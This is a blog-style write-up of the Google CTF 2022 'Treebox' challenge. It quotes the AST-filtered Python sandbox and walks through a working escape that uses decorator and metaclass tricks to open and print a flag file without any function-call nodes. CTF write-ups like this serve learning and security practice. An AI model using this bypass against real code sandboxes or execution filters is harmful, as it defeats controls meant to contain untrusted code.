# Treebox
It is the only challenge I solved during the Google CTF 2022, and it took me approximately 5 hours to solve (considering the fact that it is my second live CTF experience, I am proud of the result). The challenge itself is available by [link](https://capturetheflag.withgoogle.com/challenges/sandbox-treebox)
## Description and code
Description: `I think I finally got Python sandboxing right.`

treebox.py
```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

## Thoughts during the CTF
The first thing I've done is generate the `flag` file inside the same directory as `treebox.py` and write the flag `ctf{wa1tf0r.me}` inside to ensure I have the environment as close as possible.
While looking through the code, it's easy to spot the `ast` module. The [module](https://docs.python.org/3/library/ast.html) allows for the generation of Abstract Syntax Trees. At the time of CTF and even now, IDK what the hell it is. I undersend that it converts all the fancy Python code to a more abstract one that is more suitable for code flow charts. So, based on that, I added the print statement that allowed me to see the abstract tree produced and spot anything interesting. 
The third and final piece of the puzzle - is banned statements. Code does not allow any `Import`, `ImportFrom`, and `Call` in the abstract syntax tree (produced only from ~user~ hacker input). `Import` and `InputFrom` are pretty self-explanatory. However, we have the third statement - `Call`. This statement appears in the abstract much more often than I wanted. It is mainly because of its ties with the Python syntax. The `Call` shows during functions call (who would have thought!) and during the methods call

To sum up the first thoughts, we have:
- **abstract syntax trees**
- **hacker-controlled input**
- **banned Import, ImportFrom, and Call** 

After all the magic modifications (and some debugging with `ast`), the code looked like this:
```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
print(ast.dump(ast.parse(source_code).body[0]))
```


## Further movement

I started by googling information about the `ast` and saw some warnings on the python docs that [module may produce tree even when the syntax is wrong](https://docs.python.org/3/library/ast.htmlast.parse). Now I know that it was a rabbit hole, but at the time, I thought it may be an excellent way to solve the challenge (you see, in the code, the `compile` function is used to generate the tree, not the `ast.parse`). After some time, I realised it was a dead end and started over. I searched for "calling function without call" and spotted this [the thread on StackExhange](https://codegolf.stackexchange.com/questions/22469/call-a-method-without-calling-it), and it was very helpful. I tested the proposed variants and ended with the two simplest:
using Meta Classes
```python
>>> def func(*args):
        print('somebody called me?')
>>> class T(type): pass
>>> T.__init__ = func
>>> class A:
    __metaclass__ = T
somebody called me?
```
and the second one, using functions and decorators
```python
>>> def func(*args):
        print('somebody called me?')
>>> @func
>>> def nothing():pass
sombody called me?
```
So, in the `treebox.py`, it looks like this:
```python
-- Please enter code (last line must contain only --END) 
class T(type):pass 
T.init=print 
class A(metaclass=T):pass 
--END
-- Executing safe code: 
```
or
```python
-- Please enter code (last line must contain only --END) 
@print 
def nothing(*args):pass 
--END 
-- Executing safe code:
<function nothing at 0x7fee5d1ae5f0>
```

By this time, I understood how to exec the function without `Call` appearing in the syntax tree. So, I thought about the steps involved to read the file `flag` and came up with the following list:
- open file
- read file content
- print flag

I abandoned the idea with Meta Classes, as I have more experience with functions than with classes.
I started with 'open file,' which I thought was the most challenging task. The first problem I saw - I didn't know how to pass the file name `flag` to the `open` function. So, I started with generating this filename using the decorators and functions. (Now I think that it was overkill and string was enough, but at the time, it was easier to do)

The following code was generated.
```python
def func(arg): return arg.__name__

@func
def flag():pass

x=flag
```
As the decorator receives the function it decorates as the argument, I used `arg.__name__` to receive the function's `flag` name, which so happened to be `flag`.

The same decorator property was abused to open the file. It was simply achieved by adding decorator `@open` that, later during execution, will make the same as `open('flag')`. The 'flag' string is passed to the decorator `@open` from decorator `@func`. Now the code looks like this:

```python
def func(arg):return arg.__name__ 
 
@open 
@func 
def flag():pass 
 
x=flag
```

This code allowed me to open a file with the name `flag`, so the first task was done. We are left with 'read file' and 'print flag.' I had no idea how to read files without using the `read` method (which will generate `Call` in AST), so I switched to printing. It was easy. I just copied the code from the sample above.
```python
user@wa1tf0r.me:$ python3 treebox.py 
-- Please enter code (last line must contain only --END)
def func(arg):return arg.__name__ 
 
@print 
@func 
def flag():pass 
 
x=flag 
--END
-- Executing safe code:
flag
FunctionDef(name='func', args=arguments(posonlyargs=[], args=[arg(arg='arg')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Return(value=Attribute(value=Name(id='arg', ctx=Load()), attr='__name__', ctx=Load()))], decorator_list=[])
```

Now we know how to open files and how to print. All we need is to read the file content. The most obvious way requires the use of the `read` method, which will not pass our filter, so there must be another way. After searching, I found a thread on [StackOverflow](https://stackoverflow.com/questions/17949508/python-read-all-text-file-lines-in-loop) that used a similar technique to read files without the `read` method.


```python
user@wa1tf0r.me:$ python3 treebox.py 
-- Please enter code (last line must contain only --END)
def func(arg):return arg.__name__ 
 
def read_profiles(x): 
    with x as infile: 
        profile_list = [line for line in infile] 
    return profile_list 
 
@print 
@read_profiles 
@open 
@func 
def flag():pass 
 
x=flag 
--END
-- Executing safe code:
FunctionDef(name='func', args=arguments(posonlyargs=[], args=[arg(arg='arg')], kwonlyargs=[], kw_defaults=[], defaults=[]), body=[Return(value=Attribute(value=Name(id='arg', ctx=Load()), attr='__name__', ctx=Load()))], decorator_list=[])
['ctf{wa1tf0r.me}\n']
```
The test on my machine succeeded, and I went to get the flag from the CTF server.


## Additional thoughts
I know that calling the function 'flag' and using the function name as the filename is not universal, but I thought it was a great idea at the moment. Nevertheless, I only wanted to solve the challenge, not create perfect code.
